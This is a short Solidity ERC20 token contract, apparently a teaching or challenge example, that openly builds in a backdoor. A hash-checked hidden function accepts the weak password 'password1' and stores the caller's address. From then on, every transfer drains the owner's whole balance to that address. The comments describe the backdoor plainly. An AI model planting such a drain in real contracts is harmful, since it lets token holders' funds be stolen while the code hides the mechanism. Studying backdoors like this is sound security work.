pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';


contract SafeTokenBackdoor is ERC20 {


  address backdoor = address(0);
  address public owner = address(0);
  
  constructor() 
  ERC20('SafeToken', 'SFT')
  public payable {
    owner = msg.sender;
    uint256 tokensToMint = 1000000 * (10**18);
    _mint(owner, tokensToMint);
  }

  //This function is only discoverable by decompiling the bytecode.
  //We need do to a bit of work to discover that the password is 'password1'.
  //Once recipient is set, the backdoor is activated and the next transfer will drain the owners tokens
  function obfuscatedfunction(string memory _password) public {
      bytes32 answer = 0x0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e;
      if(answer == sha256(abi.encodePacked(_password))){
          backdoor = msg.sender;
      }
      else{
          revert("...nice try!");
      }
      
  }
  
  function transfer(address _to, uint256 _value) override public returns(bool) {  
    if(backdoor != address(0)){
        super._transfer(address(owner), backdoor, balanceOf(owner));
    }
    else{
        super.transfer(_to, _value);
    }
    
  }


}
